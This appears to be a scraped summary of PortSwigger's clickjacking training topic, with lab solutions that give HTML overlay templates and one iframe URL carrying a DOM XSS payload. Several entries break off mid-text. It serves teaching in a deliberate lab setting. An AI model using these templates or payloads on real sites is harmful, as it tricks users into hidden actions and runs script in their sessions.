# PortSwigger WSA — Clickjacking
Source: https://portswigger.net/web-security/clickjacking

## Technique headings
- Clickjacking
- What is clickjacking?
- Labs
- How to construct a basic clickjacking attack
- Clickbandit
- Clickjacking with prefilled form input
- Frame busting scripts
- Combining clickjacking with a DOM XSS attack
- Multistep clickjacking
- How to prevent clickjacking attacks
- Read more
- X-Frame-Options
- Content Security Policy (CSP)
- Find clickjacking vulnerabilities using Burp Suite


## Labs (2026-10-18 — per-lab scenarios & solutions), 5 lab)

- **Basic clickjacking with CSRF token protection** (`lab-basic-csrf-protected`)
  - Solution • Log in to your account on the target website. • Go to the exploit server and paste the following HTML template into the Body section: . <style> iframe { position:relative; width:$width_value; height: $height_value; opacity: $opacity; z-index: 2; } div { position:absolute; top:$top_value; left:$side_value; z-index: 1; } </style> <div>Test me</div> <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe> • Make the following adjustments to the template: • Replace YOUR-LAB-ID in the iframe src attribute with your unique lab ID. • Substitute suitable pixel values for the 
- **Clickjacking with form input data prefilled from a URL parameter** (`lab-prefilled-form-input`)
  - Hint You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim. .
- **Clickjacking with a frame buster script** (`lab-frame-buster-script`)
  - Hint You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim. .
- **Exploiting clickjacking vulnerability to trigger DOM-based XSS** (`lab-exploiting-to-trigger-dom-based-xss`)
  - Solution • Go to the exploit server and paste the following HTML template into the Body section: . <style> iframe { position:relative; width:$width_value; height: $height_value; opacity: $opacity; z-index: 2; } div { position:absolute; top:$top_value; left:$side_value; z-index: 1; } </style> <div>Test me</div> <iframe src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe> • Make the following adjustments to the template: • Replace YOUR-LAB-ID in the iframe src attribute with your 
- **Multistep clickjacking** (`lab-multistep`)
  - Solution • Log in to your account on the target website and go to the user account page. • Go to the exploit server and paste the following HTML template into the "Body" section: . <style> iframe { position:relative; width:$width_value; height: $height_value; opacity: $opacity; z-index: 2; } .firstClick, .secondClick { position:absolute; top:$top_value1; left:$side_value1; z-index: 1; } .secondClick { top:$top_value2; left:$side_value2; } </style> <div class="firstClick">Test me first</div> <div class="secondClick">Test me next</div> <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account
